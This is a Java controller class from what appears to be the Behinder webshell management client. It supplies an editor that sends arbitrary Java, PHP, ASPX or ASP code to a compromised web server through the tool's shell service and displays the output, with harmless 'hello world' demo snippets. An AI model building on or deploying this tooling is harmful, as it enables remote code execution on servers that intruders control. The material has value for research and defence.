package net.rebeyond.behinder.ui.controller;

import java.util.List;
import javafx.application.Platform;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.concurrent.Worker.State;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.input.Clipboard;
import javafx.scene.input.DataFormat;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.scene.web.WebView;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import netscape.javascript.JSObject;
import org.json.JSONObject;

public class UserCodeViewController {
   private ShellManager shellManager;
   @FXML
   private TextArea sourceCodeTextArea;
   @FXML
   private TextArea sourceResultArea;
   @FXML
   private WebView sourceCodeWebview;
   @FXML
   private Button runCodeBtn;
   private ShellService currentShellService;
   private JSONObject shellEntity;
   private List workList;
   private Label statusLabel;
   private JSObject editor;

   public void init(ShellService shellService, List workList, Label statusLabel) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.getShellEntity();
      this.workList = workList;
      this.statusLabel = statusLabel;

      try {
         this.initUserCodeView();
      } catch (Exception var5) {
         var5.printStackTrace();
      }

   }

   private void initUserCodeView() {
      final String javaCodeDemo = "import javax.servlet.ServletOutputStream;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpSession;\nimport javax.servlet.jsp.PageContext;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n\n    private Object Request;\n    private Object Response;\n    private Object Session;\n\n    @Override\n    public boolean equals(Object obj) {\n\n        try {\n            fillContext(obj);\n            ServletOutputStream so = ((ServletResponse) Response).getOutputStream();\n            so.write(\"hello world\".getBytes(\"UTF-8\"));\n            so.flush();\n            so.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return true;\n    }\n\n    private void fillContext(Object obj) throws Exception {\n        if (obj.getClass().getName().indexOf(\"PageContext\") >= 0) {\n            this.Request = obj.getClass().getDeclaredMethod(\"getRequest\", new Class[] {}).invoke(obj);\n            this.Response = obj.getClass().getDeclaredMethod(\"getResponse\", new Class[] {}).invoke(obj);\n            this.Session = obj.getClass().getDeclaredMethod(\"getSession\", new Class[] {}).invoke(obj);\n        } else {\n            Map<String, Object> objMap = (Map<String, Object>) obj;\n            this.Session = objMap.get(\"session\");\n            this.Response = objMap.get(\"response\");\n            this.Request = objMap.get(\"request\");\n        }\n        Response.getClass().getDeclaredMethod(\"setCharacterEncoding\", new Class[] { String.class }).invoke(Response,\n                \"UTF-8\");\n    }\n}";
      final String phpCodeDemo = "echo \"hello world\";";
      final String aspxCodeDemo = "using System;\nusing System.Web;\nusing System.Web.SessionState;\n\n    public class Eval\n    {\n        public HttpRequest Request;\n        public HttpResponse Response;\n        public HttpSessionState Session;\n\t\n\tpublic void eval(System.Web.UI.Page page)\n\t{\n\t\tthis.Response = page.Response;\n\t\tResponse.Write(\"hello world\");  \n\t}\n  }";
      final String aspCodeDemo = "response.write(\"hello world\")";
      final String currentType = this.shellEntity.getString("type");
      this.sourceCodeWebview.getEngine().load(this.getClass().getResource("/net/rebeyond/behinder/resource/codeEditor/editor_" + currentType + ".html").toExternalForm());
      this.sourceCodeWebview.getEngine().setOnAlert((event) -> {
         Utils.setClipboardString((String)event.getData());
      });
      this.sourceCodeWebview.getEngine().getLoadWorker().stateProperty().addListener(new ChangeListener<State>() {
         public void changed(ObservableValue ov, State oldState, State newState) {
            if (newState == State.SUCCEEDED) {
               JSObject window = (JSObject)UserCodeViewController.this.sourceCodeWebview.getEngine().executeScript("window");
               UserCodeViewController.this.editor = (JSObject)window.getMember("editor");
               UserCodeViewController.this.sourceCodeWebview.getEngine().executeScript("editor.on('copy',function(x){alert(x.text);return x.text;});");
               UserCodeViewController.this.sourceCodeWebview.getEngine().executeScript("editor.on('cut',function(x){alert(x.text);return x.text});");
               UserCodeViewController.this.sourceCodeWebview.addEventHandler(KeyEvent.KEY_PRESSED, (keyEvent) -> {
                  if (keyEvent.isShortcutDown() && keyEvent.getCode() == KeyCode.V) {
                     Clipboard clipboard = Clipboard.getSystemClipboard();
                     String content = (String)clipboard.getContent(DataFormat.PLAIN_TEXT);
                     if (content != null) {
                        UserCodeViewController.this.editor.call("onPaste", new Object[]{content});
                     }
                  }

               });
               String var5 = currentType;
               byte var6 = -1;
               switch(var5.hashCode()) {
               case 96894:
                  if (var5.equals("asp")) {
                     var6 = 3;
                  }
                  break;
               case 105543:
                  if (var5.equals("jsp")) {
                     var6 = 0;
                  }
                  break;
               case 110968:
                  if (var5.equals("php")) {
                     var6 = 1;
                  }
                  break;
               case 3003834:
                  if (var5.equals("aspx")) {
                     var6 = 2;
                  }
               }

               switch(var6) {
               case 0:
                  UserCodeViewController.this.editor.call("setValue", new Object[]{javaCodeDemo});
                  break;
               case 1:
                  UserCodeViewController.this.editor.call("setValue", new Object[]{"<?php\n" + phpCodeDemo + "\n?>"});
                  break;
               case 2:
                  UserCodeViewController.this.editor.call("setValue", new Object[]{aspxCodeDemo});
                  break;
               case 3:
                  UserCodeViewController.this.editor.call("setValue", new Object[]{aspCodeDemo});
               }
            }

         }
      });
      this.runCodeBtn.setOnAction((event) -> {
         try {
            this.runSourceCode();
         } catch (Exception var3) {
            var3.printStackTrace();
         }

      });
   }

   private void runSourceCode() {
      this.statusLabel.setText("正在执行……");
      String sourceCode = this.editor.call("getValue", new Object[0]).toString();
      Runnable runner = () -> {
         try {
            String finalSourceCode = sourceCode.trim();
            if (this.shellEntity.getString("type").equals("php")) {
               finalSourceCode = sourceCode.trim();
               if (finalSourceCode.startsWith("<?php")) {
                  finalSourceCode = finalSourceCode.substring(5);
               } else if (finalSourceCode.startsWith("<?")) {
                  finalSourceCode = finalSourceCode.substring(2);
               }

               if (finalSourceCode.endsWith("?>")) {
                  finalSourceCode = finalSourceCode.substring(0, finalSourceCode.length() - 2);
               }
            }

            String result = this.currentShellService.eval(finalSourceCode);
            Platform.runLater(() -> {
               this.sourceResultArea.setText(result);
               this.statusLabel.setText("完成。");
            });
         } catch (Exception var4) {
            var4.printStackTrace();
            Platform.runLater(() -> {
               this.statusLabel.setText("运行失败:" + var4.getMessage());
               this.sourceResultArea.setText(var4.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }
}
